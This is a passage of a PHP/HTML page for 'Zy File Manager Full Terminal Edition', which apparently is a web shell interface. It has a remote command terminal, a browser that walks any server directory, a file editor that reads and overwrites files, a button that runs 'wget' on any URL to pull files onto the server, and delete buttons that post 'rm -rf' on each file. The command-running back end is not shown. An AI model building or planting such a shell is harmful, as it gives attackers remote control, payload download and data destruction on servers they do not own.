        .editor {
            background: #111820;
            border-radius: 10px;
            margin-top: 20px;
            border: 1px solid #00ccff;
        }
        .editor-header {
            background: #00ccff;
            color: #000;
            padding: 10px 15px;
            font-weight: bold;
        }
        .editor textarea {
            width: 100%;
            height: 400px;
            background: #0a0e1a;
            color: #00ff88;
            border: none;
            padding: 15px;
            font-family: 'Courier New', monospace;
            font-size: 13px;
            outline: none;
        }
        
        .status-bar {
            margin-top: 20px;
            padding: 10px;
            text-align: center;
            color: #666;
            font-size: 12px;
            border-top: 1px solid #2a3a5a;
        }
    </style>
</head>
<body>
<div class="container">
    
    <!-- HEADER -->
    <div class="header">
        <h1>🐚 Zy File Manager <span style="font-size: 12px;">Full Terminal Edition</span></h1>
        <div class="path">📁 <?php echo htmlspecialchars($current_dir); ?></div>
    </div>
    
    <!-- TERMINAL UTAMA -->
    <div class="terminal">
        <div class="terminal-header">
            <span>💻 TERMINAL v2.0</span>
            <span>Type 'help' for commands</span>
        </div>
        <div class="terminal-output" id="terminalOutput">
            <?php if($output): ?>
                <div><?php echo nl2br(htmlspecialchars($output)); ?></div>
            <?php else: ?>
                <div>Zy File Manager Terminal Ready.<br>Type <span style="color:#ffff00;">help</span> to see all available commands.<br><br>Current directory: <?php echo htmlspecialchars($current_dir); ?></div>
            <?php endif; ?>
        </div>
        <form method="post" class="terminal-input" onsubmit="return true;">
            <div class="prompt">$</div>
            <input type="text" name="cmd" id="cmdInput" autocomplete="off" autofocus>
            <button type="submit">⏎ Run</button>
        </form>
    </div>
    
    <!-- QUICK ACTIONS -->
    <div class="quick-actions">
        <input type="text" id="quickUrl" placeholder="URL untuk download (wget/curl)" style="flex:2;">
        <input type="text" id="quickName" placeholder="Nama file (optional)" style="flex:1;">
        <button onclick="quickDownload()" class="btn btn-success">⬇️ Download</button>
        <button onclick="insertCommand('ls -la')" class="btn">ls -la</button>
        <button onclick="insertCommand('pwd')" class="btn">pwd</button>
        <button onclick="insertCommand('df -h')" class="btn">df -h</button>
        <button onclick="insertCommand('clear')" class="btn">clear</button>
        <button onclick="insertCommand('help')" class="btn btn-primary">help</button>
    </div>
    
    <!-- FILE BROWSER -->
    <div class="file-browser">
        <div class="file-browser-header">
            📁 File Browser - <?php echo htmlspecialchars($current_dir); ?>
            <a href="?dir=<?php echo urlencode(dirname($current_dir)); ?>" style="float:right;">⬆️ Parent</a>
        </div>
        <table>
            <thead>
                <tr><th>Name</th><th>Size</th><th>Modified</th><th>Actions</th></tr>
            </thead>
            <tbody>
                <?php
                $items = scandir($current_dir);
                if($items):
                    foreach($items as $item):
                        if($item == '.') continue;
                        $full = $current_dir . '/' . $item;
                        $is_dir = is_dir($full);
                        $icon = $is_dir ? '📁' : '📄';
                        $size = $is_dir ? '-' : format_bytes(filesize($full));
                        $time = date('Y-m-d H:i', filemtime($full));
                ?>
                <tr>
                    <td>
                        <?php if($is_dir): ?>
                            <a href="?dir=<?php echo urlencode($full); ?>"><?php echo $icon; ?> <?php echo htmlspecialchars($item); ?></a>
                        <?php else: ?>
                            <?php echo $icon; ?> <?php echo htmlspecialchars($item); ?>
                        <?php endif; ?>
                    </td>
                    <td><?php echo $size; ?></td>
                    <td><?php echo $time; ?></td>
                    <td>
                        <?php if(!$is_dir): ?>
                            <a href="?download=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn">⬇️</a>
                            <a href="?edit=<?php echo urlencode($item); ?>&dir=<?php echo urlencode($current_dir); ?>" class="btn">✍️</a>
                        <?php endif; ?>
                        <form method="post" style="display:inline;" onsubmit="return confirm('Delete <?php echo htmlspecialchars($item); ?>?')">
                            <input type="hidden" name="cmd" value="rm -rf <?php echo htmlspecialchars($item); ?>">
                            <button type="submit" class="btn btn-danger">🗑️</button>
                        </form>
                    </td>
                </tr>
                <?php endforeach; endif; ?>
            </tbody>
        </table>
    </div>
    
    <!-- EDITOR MODAL -->
    <?php if(isset($_GET['edit']) && !$edit_mode): 
        $edit_file = $current_dir . '/' . $_GET['edit'];
        if(file_exists($edit_file) && is_file($edit_file)):
    ?>
    <div class="editor">
        <div class="editor-header">✍️ EDITOR: <?php echo htmlspecialchars($_GET['edit']); ?></div>
        <form method="post">
            <input type="hidden" name="save_edit" value="<?php echo htmlspecialchars($edit_file); ?>">
            <textarea name="content"><?php echo htmlspecialchars(file_get_contents($edit_file)); ?></textarea>
            <div style="padding:10px; text-align:right; border-top:1px solid #2a3a5a;">
                <button type="submit" class="btn btn-primary">💾 Save</button>
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">Cancel</a>
            </div>
        </form>
    </div>
    <?php endif; endif; ?>
    
    <!-- EDITOR FROM TERMINAL NANO -->
    <?php if($edit_mode && isset($_SESSION['edit_file'])): ?>
    <div class="editor">
        <div class="editor-header">✍️ EDITOR: <?php echo htmlspecialchars(basename($_SESSION['edit_file'])); ?></div>
        <form method="post">
            <input type="hidden" name="save_edit" value="<?php echo htmlspecialchars($_SESSION['edit_file']); ?>">
            <textarea name="content"><?php echo htmlspecialchars($edit_file_content); ?></textarea>
            <div style="padding:10px; text-align:right; border-top:1px solid #2a3a5a;">
                <button type="submit" class="btn btn-primary">💾 Save</button>
                <a href="?dir=<?php echo urlencode($current_dir); ?>" class="btn">Cancel</a>
            </div>
        </form>
    </div>
    <?php endif; ?>
    
    <div class="status-bar">
        Zy File Manager | PHP: <?php echo phpversion(); ?> | Commands: 50+ | WGET/CURL Support | ZIP/TAR Support
    </div>
    
</div>

<script>
// Auto scroll terminal
var terminalOutput = document.getElementById('terminalOutput');
if(terminalOutput) terminalOutput.scrollTop = terminalOutput.scrollHeight;

// Insert command ke input
function insertCommand(cmd) {
    document.getElementById('cmdInput').value = cmd;
    document.getElementById('cmdInput').focus();
}

// Quick download
function quickDownload() {
    var url = document.getElementById('quickUrl').value;
    var name = document.getElementById('quickName').value;
    if(!url) {
        alert('Masukkan URL!');
        return;
    }
    var cmd = name ? 'wget -O ' + name + ' ' + url : 'wget ' + url;
    document.getElementById('cmdInput').value = cmd;
    document.querySelector('.terminal-input button').click();
}

// Keyboard shortcuts
document.addEventListener('keydown', function(e) {
    // Ctrl+L clear terminal
    if(e.ctrlKey && e.key === 'l') {
        e.preventDefault();
        document.getElementById('cmdInput').value = 'clear';
        document.querySelector('.terminal-input button').click();
    }
    // Ctrl+U focus URL
    if(e.ctrlKey && e.key === 'u') {
        e.preventDefault();
        document.getElementById('quickUrl').focus();
    }
    // Up arrow untuk history
    if(e.key === 'ArrowUp' && document.activeElement === document.getElementById('cmdInput')) {
        e.preventDefault();
        // Sederhana: reload last command dari server (bisa dikembangkan)
    }
});

// Focus on load
document.getElementById('cmdInput').focus();
</script>

</body>
</html>